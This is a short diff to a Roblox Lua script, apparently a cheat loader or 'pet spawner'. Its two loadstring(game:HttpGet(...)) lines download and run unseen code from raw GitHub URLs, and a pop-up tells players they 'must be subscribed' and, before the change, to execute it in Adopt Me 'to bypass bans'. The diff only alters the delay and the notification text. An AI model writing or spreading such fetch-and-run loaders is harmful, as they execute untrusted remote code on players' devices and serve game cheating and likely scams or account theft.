@@ -1,8 +1,8 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/iwantsom3/script/refs/heads/main/Gago",true))()
-wait(2)
+wait(1)
 game.StarterGui:SetCore("SendNotification", {
     Title = "🔔 You must be subscribed to me for 1/2 Day",
-    Text = "ALSO You Must Unlock The Script By Executing In Adopt Me To Bypass Bans!",
+    Text = "Detecting...",
     Duration = 6
 })
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual",true))()
